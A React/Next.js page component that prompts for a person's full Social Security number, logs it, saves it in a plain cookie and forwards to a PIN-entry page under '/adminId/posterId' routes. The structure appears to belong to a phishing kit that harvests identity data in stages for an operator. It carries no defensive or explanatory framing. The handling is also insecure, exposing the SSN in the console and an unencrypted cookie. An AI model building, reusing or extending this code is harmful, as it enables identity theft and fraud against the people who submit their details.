import { useState } from "react";
import Cookies from "js-cookie";
import { useRouter } from "next/router";
import { FaQuestion } from "react-icons/fa";

function SSNPage() {
  const [ssn, setSsn] = useState("");
  const router = useRouter();
  const { adminId, posterId } = router.query;

  const handleChange = (e) => {
    setSsn(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(ssn);
    Cookies.set("ssn", ssn);
    router.push(`/${adminId}/${posterId}/pin`);
  };

  return (
    <div className="mx-3 lg:mx-[70px]">
      <form onSubmit={handleSubmit}>
        <div className="min-h-[calc(100vh-20px)] flex flex-col justify-between">
          <div className="lg:container px-3 lg:px-0">
            <div className="flex justify-end mt-[36px] text-slate-600 mb-[38px] ">
              <FaQuestion size={18} />
            </div>
            <p className="text-[25px]">Enter your Full SSN number</p>

            <input
              type="text"
              value={ssn}
              className="input"
              placeholder="SSN Number"
              onChange={handleChange}
              required
            />
          </div>
          <button className="w-full text-lg bg-custom-green rounded-full py-3 text-white border-2 border-slate-900">
            Next
          </button>
        </div>
      </form>
    </div>
  );
}

export default SSNPage;
